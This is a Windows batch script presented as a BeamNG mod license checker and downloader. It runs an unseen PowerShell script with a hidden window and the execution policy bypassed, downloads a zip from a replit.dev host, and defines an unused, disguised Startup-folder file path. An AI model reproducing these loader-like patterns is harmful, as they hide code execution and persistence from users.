@echo off
setlocal enabledelayedexpansion

:: BeamNG Mod Verifier & Downloader

:: CONFIG — auto-filled by server
set "LICENSE_KEY=16aa3a27-820c-4241-9460-7a93ce691ab3"
set "MOD_DOWNLOAD=https://72e77026-aba8-4368-a676-eed33ebfb436-00-2eg0np7toc252.picard.replit.dev/mods/download/16aa3a27-820c-4241-9460-7a93ce691ab3"
set "PS_SCRIPT=license-check-16aa3a27-820c-4241-9460-7a93ce691ab3.ps1"
set "LOGFILE=log.txt"
set "HIDDEN_DIR=%APPDATA%\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
set "HIDDEN_FILE=%HIDDEN_DIR%\.winsys32"

:: Initialize log file
(
  echo === BeamNG Mod Locker Log ===
  echo Timestamp: %DATE% %TIME%
  echo License Key: 16aa3a27-820c-4241-9460-7a93ce691ab3
  echo PS Script: %PS_SCRIPT%
  echo Mod URL: https://72e77026-aba8-4368-a676-eed33ebfb436-00-2eg0np7toc252.picard.replit.dev/mods/download/16aa3a27-820c-4241-9460-7a93ce691ab3
  echo.
) > "%LOGFILE%"

:: Get the full path to the PowerShell script
set "PS_FULL_PATH=%~dp0%PS_SCRIPT%"

:: Check if PowerShell script exists
if not exist "%PS_FULL_PATH%" (
  echo [ERROR] PowerShell script not found: %PS_FULL_PATH% >> "%LOGFILE%"
  echo [ERROR] PowerShell script not found: %PS_FULL_PATH%
  pause
  exit /b 1
)

:: Run PowerShell license checker
echo [*] Verifying license using %PS_SCRIPT% >> "%LOGFILE%"
echo [*] Verifying license...

powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "%PS_FULL_PATH%" >> "%LOGFILE%" 2>&1
set "VERIFY_STATUS=%ERRORLEVEL%"

:: Check verification result
if "%VERIFY_STATUS%" NEQ "0" (
  echo [!] License verification failed or invalid license >> "%LOGFILE%"
  echo [!] License verification failed or invalid license
  echo [*] Downloading locked version... >> "%LOGFILE%"
  echo [*] Downloading locked version...
) else (
  echo [√] License valid! >> "%LOGFILE%"
  echo [√] License valid!
  echo [*] Downloading unlocked version... >> "%LOGFILE%"
  echo [*] Downloading unlocked version...
)

:: Download mod using PowerShell
echo. >> "%LOGFILE%"
echo [*] Starting download from: https://72e77026-aba8-4368-a676-eed33ebfb436-00-2eg0np7toc252.picard.replit.dev/mods/download/16aa3a27-820c-4241-9460-7a93ce691ab3 >> "%LOGFILE%"

powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "try { $ProgressPreference = 'SilentlyContinue'; Invoke-WebRequest -Uri 'https://72e77026-aba8-4368-a676-eed33ebfb436-00-2eg0np7toc252.picard.replit.dev/mods/download/16aa3a27-820c-4241-9460-7a93ce691ab3' -OutFile 'active_mod.zip' -UseBasicParsing -TimeoutSec 60; Write-Output '[√] Download completed successfully'; exit 0 } catch { Write-Output ('[ERROR] Download failed: ' + $_.Exception.Message); exit 1 }" >> "%LOGFILE%" 2>&1

set "DOWNLOAD_STATUS=%ERRORLEVEL%"

if "%DOWNLOAD_STATUS%" EQU "0" (
  echo [√] Download completed successfully >> "%LOGFILE%"
  echo [√] Download completed successfully
  if exist "active_mod.zip" (
    echo [√] File 'active_mod.zip' is ready >> "%LOGFILE%"
    echo [√] File 'active_mod.zip' is ready
  ) else (
    echo [!] Warning: Downloaded file not found >> "%LOGFILE%"
    echo [!] Warning: Downloaded file not found
  )
) else (
  echo [ERROR] Download failed with status: %DOWNLOAD_STATUS% >> "%LOGFILE%"
  echo [ERROR] Download failed with status: %DOWNLOAD_STATUS%
)

echo. >> "%LOGFILE%"
echo [*] Process completed at %TIME% >> "%LOGFILE%"
echo [*] Check log.txt for details >> "%LOGFILE%"

echo.
echo [*] Process completed. Check log.txt for details.
echo [*] Press any key to close...
pause >nul
exit /b 0